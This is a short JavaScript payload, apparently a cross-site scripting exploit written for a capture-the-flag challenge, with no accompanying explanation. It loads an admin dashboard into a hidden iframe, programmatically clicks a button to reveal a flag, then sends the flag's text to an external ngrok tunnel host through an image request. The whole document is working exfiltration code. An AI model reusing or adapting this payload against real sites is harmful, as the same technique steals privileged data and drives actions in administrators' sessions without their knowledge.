fetch("/admin/dashboard")
.then(r=>r.text())
.then(d=>{
let i=document.createElement("iframe");
i.style.display="none";
document.body.appendChild(i);

i.contentDocument.open();
i.contentDocument.write(d);
i.contentDocument.close();

setTimeout(()=>{
let btn=i.contentDocument.getElementById("fetchFlag2Btn");
if(btn)btn.click();

setTimeout(()=>{
let f=i.contentDocument.getElementById("flag2Content");
if(f){
new Image().src="https://7368-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?flag="+f.innerText
}
},1500);

},1000);

});
